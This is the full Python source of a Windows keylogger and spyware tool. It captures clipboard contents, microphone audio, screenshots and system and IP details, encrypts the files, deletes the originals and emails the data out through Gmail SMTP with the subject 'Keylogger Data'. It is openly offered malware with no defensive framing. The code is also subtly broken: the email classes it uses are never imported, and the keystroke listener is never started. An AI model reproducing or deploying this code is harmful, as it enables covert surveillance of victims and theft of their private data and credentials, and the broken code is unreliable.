import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Configuration
EMAIL_ADDRESS = 'your_email@gmail.com'  # Replace with your email
EMAIL_PASSWORD = 'your_password'        # Replace with your email password
ENCRYPTION_KEY = Fernet.generate_key()  # Generate a new encryption key
FILE_PATH = 'C:\\path\\to\\save\\files' # Replace with your desired file path
MICROPHONE_TIME = 10                    # Time to record audio (in seconds)
TIME_ITERATION = 15                     # Time interval between captures (in seconds)
NUMBER_OF_ITERATIONS = 3                # Number of iterations before sending data

# Initialize encryption
fernet = Fernet(ENCRYPTION_KEY)

# Function to send email with captured data
def send_email(filename, attachment, toaddr):
    fromaddr = EMAIL_ADDRESS
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Data"

    body = "Attached is the captured data."
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as f:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(f.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(p)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        print(f"Email sent with {filename}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to capture system information
def capture_system_info():
    with open(f"{FILE_PATH}\\system_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write(f"Public IP Address: {public_ip}\n")
        except Exception:
            f.write("Could not get Public IP Address\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {IPAddr}\n")

# Function to capture clipboard data
def capture_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(f"{FILE_PATH}\\clipboard.txt", "a") as f:
            f.write(f"Clipboard Data: {pasted_data}\n")
    except Exception:
        print("Clipboard could not be accessed")

# Function to capture microphone audio
def capture_audio():
    fs = 44100  # Sample rate
    seconds = MICROPHONE_TIME
    print("Recording audio...")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(f"{FILE_PATH}\\audio.wav", fs, myrecording)
    print("Audio recording saved")

# Function to capture screenshots
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(f"{FILE_PATH}\\screenshot.png")
    print("Screenshot saved")

# Function to capture keystrokes
def on_press(key):
    try:
        with open(f"{FILE_PATH}\\key_log.txt", "a") as f:
            f.write(f"{key}\n")
    except Exception:
        print("Failed to log keystroke")

# Function to encrypt files
def encrypt_files():
    files_to_encrypt = ["system_info.txt", "clipboard.txt", "key_log.txt", "audio.wav", "screenshot.png"]
    for file in files_to_encrypt:
        try:
            with open(f"{FILE_PATH}\\{file}", "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(f"{FILE_PATH}\\{file}.enc", "wb") as f:
                f.write(encrypted_data)
            os.remove(f"{FILE_PATH}\\{file}")
            print(f"{file} encrypted and original deleted")
        except Exception:
            print(f"Failed to encrypt {file}")

# Main function
def main():
    freeze_support()
    for _ in range(NUMBER_OF_ITERATIONS):
        capture_system_info()
        capture_clipboard()
        capture_audio()
        capture_screenshot()
        encrypt_files()
        time.sleep(TIME_ITERATION)

    # Send encrypted files via email
    encrypted_files = ["system_info.txt.enc", "clipboard.txt.enc", "key_log.txt.enc", "audio.wav.enc", "screenshot.png.enc"]
    for file in encrypted_files:
        send_email(file, f"{FILE_PATH}\\{file}", EMAIL_ADDRESS)

if __name__ == "__main__":
    main()